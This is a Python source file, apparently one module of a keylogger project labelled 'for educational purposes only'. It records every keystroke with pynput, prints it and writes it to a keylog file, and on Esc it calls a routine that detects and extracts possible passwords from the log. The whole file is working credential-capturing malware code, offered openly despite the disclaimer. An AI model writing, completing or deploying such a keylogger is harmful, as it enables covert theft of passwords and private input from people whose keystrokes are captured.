# This script is a keylogger for educational purposes only.
# Author: @juanmafe.
# GPLv3 2022.

from pynput import keyboard
from SaveFile import SaveFile
from Properties import Properties
from DetectPassword import DetectPassword

class ProcessingKey():

	def record_key():
		listener = keyboard.Listener(on_press=ProcessingKey.print_data_console)
		listener.start()
		listener.join()


	def wait_back_key():
		listener = keyboard.Listener(on_press=ProcessingKey.any_key_pressed)
		listener.start()
		listener.join()


	def any_key_pressed(key):
		return not isinstance(key, keyboard.Key)


	def print_data_console(key):

		if key == keyboard.Key.esc:
			DetectPassword.detect_and_obtain_possible_passwords()
			return False

		print(Properties.msg_key_pressed, key)
		escaped_key = ProcessingKey.escape_key(str(key))
		SaveFile.save_in_keylog(escaped_key)


	def escape_key(key_unscaped):
		key_scaped = key_unscaped.replace(Properties.quote, Properties.empty)
		key_scaped = key_scaped.replace(Properties.key_space, Properties.whitespace)
		key_scaped = key_scaped.replace(Properties.key_enter,Properties.whitespace)
		key_scaped = key_scaped.replace(Properties.key_shift_right,Properties.empty).replace(Properties.key_shift_left,Properties.empty)
		key_scaped = key_scaped.replace(Properties.key_caps_lock, Properties.empty)
		return key_scaped

#EOF